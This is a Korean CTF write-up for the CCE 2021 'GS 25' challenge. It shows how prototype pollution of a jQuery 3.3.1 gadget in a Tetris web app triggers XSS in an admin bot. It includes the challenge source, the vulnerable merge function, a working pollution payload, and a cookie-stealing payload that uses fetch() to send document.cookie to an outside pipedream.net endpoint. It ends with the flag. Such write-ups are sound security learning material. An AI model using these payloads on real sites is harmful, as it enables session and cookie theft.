## Summary
25일에는 국정원에서 여는 CCE가 있었는데, 오후 11시 10분인가 대회 끝나기 몇 십 분 전에 아는 분이 풀어 주라고 해서 잠시 GS 25 문제를 풀어 보았는데 매우 쉽게 풀렸습니다. Prototype Pollution 취약점도 처음 공부할 때 조금 힘들었는데, 지금은 쉬운 취약점 중 하나 입니다.

---
## GS 25 [2** pts]

GS 25 문제는 Prototype Pollution을 이용해 Jquery 가젯을 오염 시켜 XSS를 트리거 했습니다.

```sh
~/Exploit/ctf/2021/CCE 2021 main*
❯ tree for_user
for_user
└── for_user
    ├── docker
    │   ├── Dockerfile
    │   └── src
    │       ├── app.js
    │       ├── package.json
    │       ├── route
    │       │   └── index.js
    │       ├── run.sh
    │       ├── static
    │       │   ├── css
    │       │   │   ├── free-v4-font-face.min.css
    │       │   │   ├── free-v4-shims.min.css
    │       │   │   ├── free.min.css
    │       │   │   ├── main.css
    │       │   │   ├── tetris.css
    │       │   │   └── theme.css
    │       │   ├── js
    │       │   │   ├── axios.min.js
    │       │   │   ├── axios.min.map
    │       │   │   ├── bootstrap.min.js
    │       │   │   ├── bootstrap.min.js.map
    │       │   │   ├── fontawesome.js
    │       │   │   ├── game
    │       │   │   │   ├── piece.js
    │       │   │   │   ├── tetris.js
    │       │   │   │   └── tetrominoes.js
    │       │   │   ├── index.js
    │       │   │   ├── jquery-3.3.1.slim.min.js
    │       │   │   ├── popper.min.js
    │       │   │   └── popper.min.js.map
    │       │   └── texture.jpg
    │       └── views
    │           ├── component
    │           │   ├── footer.ejs
    │           │   ├── header.ejs
    │           │   └── navbar.ejs
    │           ├── game.ejs
    │           ├── index.ejs
    │           └── login.ejs
    ├── docker-compose.yml
    └── robot
        ├── Dockerfile
        └── src
            ├── app.js
            ├── package-lock.json
            ├── package.json
            ├── run.sh
            └── views
                └── index.ejs

13 directories, 37 files

~/Exploit/ctf/2021/CCE 2021 main*
❯
```
문제 코드는 위와 같이 주어졌습니다. 굉장히 많습니다 :(

```javascript
const express = require('express')
const app = express()
// const __DIR = '/usr/src/app'
const __DIR = './'
const puppeteer = require('puppeteer')
const url = 'http://prob'

/* express */
app.set('views', __DIR + '/views')
app.set('view engine', 'ejs')
app.engine('html', require('ejs').renderFile)

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.get('/', (req, res) => {
  res.render('index')
})

app.post('/', async (req, res) => {
  const { fileName, code } = req.body
  const cookies = [{
    'name': 'fileName',
    'value': fileName
  },
  {
    'name': 'flag',
    'value': 'cce2021{EXAMPLE_FLAG}'
  }
  ]

  await (async () => {
    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] })
    const page = await browser.newPage()

    page.on('dialog', async dialog => {
      if(dialog.message() == 'Input your game data code') await dialog.accept(code)
      else await dialog.dismiss()
    })

    await page.goto(url, {
      waitUntil: 'networkidle2',
    })

    await page.setCookie(...cookies)
  
    await page.click('#playBtn')
    
    await page.keyboard.type('l')

    await new Promise(resolve => setTimeout(resolve, 1000))

    await browser.close()
  })()

  res.send("Done")
})

app.listen(80)
```
플래그 얻는 조건을 보면 관리자 봇의 쿠키를 탈취하면 되고, 탈취 하기 위해서는 XSS를 트리거 해야 합니다.

```javascript
async function loadGame(){
  
  const code = prompt('Input your game data code')
  const req = await axios.post('/loadGame', { code })
  const result = req.data
  
  if (result.state !== 'ok') {
    alert('error')
    return 
  }

  const data = req.data.data

  function isObject(obj) {
    return obj !== null && typeof obj === 'object'
  }

  function merge(a, b) {
    for (let key in b) {
      if (isObject(a[key]) && isObject(b[key])) {
        merge(a[key], b[key])
      } else {
        a[key] = b[key]
      }
    }
    return a
  }

  this.cGameInfo = new GameInfo()
  merge(this.cGameInfo, data)
  initScreen()
  initPiecesMap(cGameInfo.panelRow, cGameInfo.panelColume)
  initDisplayGamePanel(cGameInfo.panelColume, cGameInfo.panelRow)
  initNextBlockInfo()
  setNextPieces()
  clearInterval(this.cGameInfo.dropIntervalId)
  setDropInterval()
  $(document).off('keydown')
  document.addEventListener('keydown', keyboardEventHandler)
  $(document).off('touchmove')
  setControleButton()
  
  this.cGameInfo.changeSpeedDisplay()
  this.cGameInfo.updateScore(0)
}
```
소스 코드를 확인 하던 중에 tetris.js에서 loadGame() 이라는 함수를 발견 했습니다. loadGame() 함수는 /loadGame로 고유의 Code 값을 요청 보내서 Code 값에 대응하는 게임의 정보(객체)를 가져와서, merge() 함수를 이용해 GameInfo 객체를 덮어 주고 있습니다.

또한 해당 문제에서 Jquery 3.3.1을 사용 중이기 때문에 XSS 가젯을 찾고, 해당 가젯을 오염 시켜 XSS를 트리거 하기로 했습니다.
```javascript
  $(document).off('keydown')
  document.addEventListener('keydown', keyboardEventHandler)
  $(document).off('touchmove')
```
loadGame() 함수를 자세히 보니 내부에 XSS 가젯이 존재하는 것을 확인할 수 있었습니다.

```javascript
async function keyboardEventHandler(e) {
  //space 키 => c
  if(e.keyCode == 67) {
    cGameInfo.cPiece.moveEndDown();
  //왼쪽 화살표 => a
  } else if(e.keyCode == 65) {
    cGameInfo.cPiece.moveLeft();
  //위쪽 화살표 => w
  } else if(e.keyCode == 87)  {
    cGameInfo.cPiece.rotate();
  //오른쪽 화살표 => d
  } else if(e.keyCode == 68)  {
    cGameInfo.cPiece.moveRight();
  //아래 화살표 => s
  } else if(e.keyCode == 83)  {
    cGameInfo.cPiece.moveDown();
  //세이브 => p
  } else if(e.keyCode == 80) {
    await saveGame()
  // 로드 => l
  }else if(e.keyCode == 76) {
    await loadGame()
  }
}
```
loadGame() 함수는 자동으로 호출 해주지 않고, 키보드로 L, l을 입력해야 실행을 해주고 있었습니다.

```javascript
    await page.click('#playBtn')
    
    await page.keyboard.type('l')

    await new Promise(resolve => setTimeout(resolve, 1000))
```
하지만 관리자 봇에서 keyboard 메서드를 이용해서 l을 입력 하고 있기 때문에 관리자 봇에서도 결국엔 loadGame() 함수가 실행 되기 때문에 그냥 익스를 시도 하면 되겠다고 생각했습니다.

```http
POST /saveGame HTTP/1.1
Host: 20.194.62.226:4423
Content-Length: 198
Accept: application/json, text/plain, */* Chrome/92.0.4515.107 Safari/537.36
Content-Type: application/json;charset=UTF-8
Cookie: fileName=01f032bb-3210-4dd3-9555-078cfa75196d
Connection: close

{"data":{"__proto__":{"__proto__":{"preventDefault":"x", "handleObj":"x","delegateTarget":"<img/src/onerror=alert(1)>"}}}}
```
일단 XSS가 잘 되는 지 확인 하기 위해 위와 같이 게임을 저장한 후에 loadGame() 함수를 실행시켜 보았다.

![](https://user-images.githubusercontent.com/49112423/134794962-40c6441c-6863-4a25-a588-9b56537e5935.png)

예상대로 XSS 트리거가 잘 되는 것을 확인할 수 있었습니다.

```txt
{"data":{"__proto__":{"__proto__":{"preventDefault":"x", "handleObj":"x","delegateTarget":"<img/src/onerror=fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=`+document.cookie)>"}}}}
```
쿠키 탈취 POC는 위와 같습니다.

- Scenario

  - /saveGame에서 Prototype Pollution POC를 저장한다.
  - 신고 로직에서 filename과 POC가 들어 있는 Code 번호를 넘긴다.

![](https://user-images.githubusercontent.com/49112423/134795008-eb26caf9-7fa3-4a69-a509-5a729ee8cd57.png)

위 시나리오를 기반으로 익스를 시도 하니 플래그를 탈취할 수 있었습니다.

> cce2021{5cd5185ef46ce86f6c33543f75752a559fa843ec91a1176144f1a15d468f318d}

---
